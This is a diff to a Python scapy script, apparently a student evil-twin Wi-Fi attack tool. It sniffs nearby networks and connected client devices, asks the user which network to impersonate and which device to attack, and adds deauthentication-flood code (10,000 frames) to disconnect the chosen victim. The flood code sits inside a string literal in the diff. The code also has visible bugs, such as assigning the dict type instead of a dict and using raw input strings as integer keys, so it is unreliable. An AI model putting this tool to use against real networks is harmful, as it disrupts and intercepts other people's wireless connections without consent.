@@ -1,30 +1,19 @@
 import os
-import sys
-
-from alive_progress import alive_bar
 from progress.bar import IncrementalBar, ShadyBar, PixelBar
 from scapy.all import *
 from threading import Thread
 import pandas
 import time
 import netifaces
-import alive_progress
+from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap, Dot11Deauth
 
 # global variables
-from scapy.layers.dot11 import Dot11
-
 networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
 networks.set_index("BSSID", inplace=True)
-macs = dict()
-interface = ""
-network_mac = ""
-devices_macs = dict()
-victim_mac = ""
-i2 = 0
+network_mac = dict
 tic = time.perf_counter()
 ch = 1
 devices = dict()
-Networks = dict()
 presentation = '''
 
   ______           _   _     _______              _         
@@ -40,9 +29,7 @@ made by: Hosam Hegly, Ayman Younis, Ahmad Abed
 
 
 def main():
-    global victim_mac
     global network_mac
-    global interface
     global presentation
     print(presentation)
     interface = get_interface()
@@ -57,6 +44,16 @@ def main():
     progbar = Thread(target=progressbar(), daemon=True)
     progbar.start()
     sniff(prn=callback, iface=interface, timeout=60)
+    twin = get_network().lower()
+
+
+'''victim = get_device(twin).lower()
+    # deauthentication packet to disconnect the victim device from the network
+    deauth = Dot11(type=0, subtype=12, addr1=victim, addr2=twin, addr3=twin)
+    # stack packet headers
+    deauth_pkt = RadioTap() / deauth / Dot11Deauth(reason=7)
+    # send the packet
+    sendp(deauth_pkt, inter=0.1, count=10000, iface=interface, verbose=1)'''
 
 
 # display a progress bar for aesthetics
@@ -104,9 +101,68 @@ def change_channel():
 # captures wireless networks and devices with packets sniffed by scapy
 def callback(pkt):
     if pkt.haslayer(Dot11):
-        ds = pkt.FCfield & 0x3  # Distribution server
+        mac_frame = pkt.getlayer(Dot11)
+        ds = pkt.FCfield & 0x3  # frame control
         to_ds = ds & 0x1 != 0  # to access point
         from_ds = ds & 0x2 != 0  # from access point
+
+        if pkt.type == 0 and pkt.subtype == 8:  # beacon which means its coming from a network
+            bssid = mac_frame.addr2
+            ssid = pkt[Dot11Elt].info.decode()  # network name
+            if mac_frame.addr2 not in devices:
+                devices[mac_frame.addr2] = set()
+                network_mac[mac_frame.addr2] = ssid
+
+        if from_ds == 1 and to_ds == 0:  # transmitter is AP and destination is client
+            if mac_frame.addr2 in devices and mac_frame.addr2 != mac_frame.addr3 and mac_frame.addr3 \
+                    not in devices[mac_frame.addr2]:
+                devices[mac_frame.addr2].add(mac_frame.addr3)
+
+        if from_ds == 0 and to_ds == 1:  # source address is client and transmitter is AP
+
+            if mac_frame.addr1 in devices and mac_frame.addr2 != mac_frame.addr1 and mac_frame.addr2 \
+                    not in devices[mac_frame.addr1]:
+                devices[mac_frame.addr1].add(mac_frame.addr2)
+
+        if from_ds == 0 and to_ds == 0:  # control frame or managment from which means src is AP
+            if mac_frame.addr3 in devices and mac_frame.addr2 not in devices[mac_frame.addr3]:
+                devices[mac_frame.addr3].add(mac_frame.addr2)
+
+        if from_ds == 1 and to_ds == 1:  # transmitter and reciever are APs
+            if mac_frame.addr2 in devices and mac_frame.addr2 != mac_frame.addr4 and \
+                    mac_frame.addr4 not in devices[mac_frame.addr2]:
+                devices[mac_frame.addr3].add(mac_frame.addr2)
+            if mac_frame.addr1 in devices and mac_frame.addr1 != mac_frame.addr3 and mac_frame.addr3 not in \
+                    devices[mac_frame.addr1]:
+                devices[mac_frame.addr1].add(mac_frame.addr3)
+
+
+# get a list of networks and return the mac of the network chosen by the user
+def get_network():
+    global network_mac
+    net_index = dict()
+    i = 0
+    print("Detected networks")
+    for network in network_mac:
+        print(i, "- " + str(network_mac[network]))
+        net_index[i] = network
+        i = i + 1
+    k = input("Choose the network you want to impersonate (press 0 - " + str(i) + "): ")
+    return net_index[k]
+
+
+# list of devices connected to the chosen network and return the victim device chosen by the user
+def get_device(captive):
+    global devices
+    device_mac = dict()
+    print("mac address of connected devices")
+    i = 0
+    for device in devices[captive]:
+        print(i, "- " + str(device))
+        device_mac[i] = device
+        i = i + 1
+    k = input("Choose the device you want to attack (press 0 - " + str(i) + "): ")
+    return device_mac[k]
 
 
 main()
